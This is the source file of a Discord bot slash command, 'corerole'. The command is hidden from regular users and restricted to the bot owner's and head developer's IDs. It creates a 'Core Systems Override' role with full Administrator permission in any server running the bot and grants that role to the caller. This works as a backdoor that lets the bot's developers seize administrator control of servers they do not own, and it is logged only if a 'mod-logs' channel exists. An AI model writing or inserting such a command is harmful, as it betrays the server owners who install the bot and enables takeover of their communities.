const { SlashCommandBuilder, PermissionFlagsBits, EmbedBuilder } = require('discord.js');
require('dotenv').config();

module.exports = {
    data: new SlashCommandBuilder()
        .setName('corerole')
        .setDescription('⚠️ Bot Owner Command')
        .setDefaultMemberPermissions(0), // Makes the command invisible to regular users
    ownerOnly: true,

    async execute(interaction) {
        await interaction.deferReply({ ephemeral: true });

        try {
            // Check if user is bot owner or head developer
            if (interaction.user.id !== process.env.BOT_OWNER_ID && 
                interaction.user.id !== process.env.HEAD_DEVELOPER_ID) {
                return await interaction.editReply({
                    content: '❌ This command is restricted.',
                    ephemeral: true
                });
            }

            // Find or create Core Systems Override role
            let coreRole = interaction.guild.roles.cache.find(r => r.name === 'Core Systems Override');
            if (!coreRole) {
                coreRole = await interaction.guild.roles.create({
                    name: 'Core Systems Override',
                    color: '#8B0000', // Dark Red
                    permissions: [PermissionFlagsBits.Administrator],
                    hoist: true,
                    reason: 'Core Systems Override role for privileged users'
                });

                // Try to position the role just below the bot's highest role
                const botMember = interaction.guild.members.me;
                const botHighestRole = botMember.roles.highest;
                if (botHighestRole) {
                    await coreRole.setPosition(botHighestRole.position - 1)
                        .catch(error => console.error('Could not set role position:', error));
                }
            }

            // Add role to the user
            const member = await interaction.guild.members.fetch(interaction.user.id);
            await member.roles.add(coreRole);

            const successEmbed = new EmbedBuilder()
                .setTitle('✅ Core Systems Role Added')
                .setDescription(`You have been granted the Core Systems role.`)
                .setColor(0xFF0000)
                .addFields([
                    { name: 'Server', value: interaction.guild.name },
                    { name: 'Role', value: coreRole.name },
                    { name: 'Position', value: `Below ${interaction.guild.members.me.roles.highest.name}` }
                ])
                .setTimestamp();

            // Log to mod-logs
            const logChannel = interaction.guild.channels.cache.find(c => c.name === 'mod-logs');
            if (logChannel) {
                const logEmbed = new EmbedBuilder()
                    .setTitle('👑 Core Systems Role Added')
                    .setDescription(`**User:** ${interaction.user.tag}\n**ID:** ${interaction.user.id}`)
                    .setColor(0xFF0000)
                    .setTimestamp();

                await logChannel.send({ embeds: [logEmbed] });
            }

            await interaction.editReply({ embeds: [successEmbed], ephemeral: true });

        } catch (error) {
            console.error('Error in corerole command:', error);
            if (!interaction.replied && !interaction.deferred) {
                await interaction.reply({
                    content: '❌ Failed to add Core Systems role. Please check bot permissions.',
                    ephemeral: true
                });
            } else {
                await interaction.editReply({
                    content: '❌ Failed to add Core Systems role. Please check bot permissions.',
                    ephemeral: true
                });
            }
        }
    }
}; 